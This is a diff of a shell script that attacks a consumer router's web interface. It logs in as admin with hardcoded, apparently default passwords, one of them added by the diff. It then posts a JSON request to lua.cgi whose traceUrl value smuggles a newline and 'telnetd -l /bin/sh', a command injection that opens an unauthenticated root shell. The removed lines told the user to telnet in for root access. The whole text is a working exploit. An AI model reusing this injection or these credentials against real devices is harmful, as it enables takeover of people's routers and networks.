@@ -3,6 +3,7 @@
 # read -p 'Username: ' USERNAME
 # read -sp 'Password: ' PASSWORD
 USERNAME='admin'
+# PASSWORD='Globe@81F3'
 PASSWORD='Globe@63C3'
 
 echo
@@ -29,5 +30,3 @@ curl 'http://192.168.254.254/cgi-bin/lua.cgi' \
   -H 'Content-Type: application/json; charset=UTF-8' \
   --data-raw "{\"method\":\"POST\",\"cmd\":145,\"tool\":\"trace_start\",\"tracePort\":\"\",\"traceUrl\":\"127.0.0.1\ntelnetd -l /bin/sh\",\"sessionId\":\"${SESSION_ID}\"}"
 
-#echo "Run `telnet 192.168.254.254` to access the root shell"
-#echo "Make sure to `killall telnetd` afterwards"
